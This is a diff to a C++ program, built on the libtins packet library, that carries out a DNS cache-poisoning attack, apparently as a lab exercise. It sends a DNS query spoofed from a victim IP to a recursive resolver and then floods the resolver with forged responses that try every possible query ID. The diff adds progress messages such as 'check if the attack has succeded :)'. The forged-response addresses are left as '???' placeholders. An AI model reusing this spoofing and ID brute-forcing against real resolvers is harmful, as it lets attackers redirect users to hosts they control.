@@ -1,4 +1,5 @@
 #include <tins/tins.h>
+#include <iostream>
 
 using namespace Tins;
 
@@ -29,9 +30,13 @@ int main() {
     DNS::query dns_query(ATTACKING_HOST, DNS::A, DNS::IN);
     dns_request.add_query(dns_query);
 
+    std::cout << "Sending DNS request for host " << ATTACKING_HOST << " to trigger the recursive requests..." << std::endl;
+
     // Send the packet
     IP query_pkt = IP(RECURSIVE_DNS, VICTIM_IP) / UDP(53, 1234) / dns_request;
     sender.send(query_pkt);
+
+    std::cout << "Trying all possible query IDs..." << std::endl;
 
     // Try all possible query IDs
     for(unsigned int query_id = MIN_QUERY_ID; query_id < MAX_QUERY_ID; query_id++) {
@@ -60,4 +65,8 @@ int main() {
         IP resp_pkt = IP("???", "???") / UDP(33333, 53) / dns_response;
         sender.send(resp_pkt);
     }
+
+    std::cout << "Done trying all possible query IDs, check if the attack has succeded :)" << std::endl;
+
+    return 0;
 }
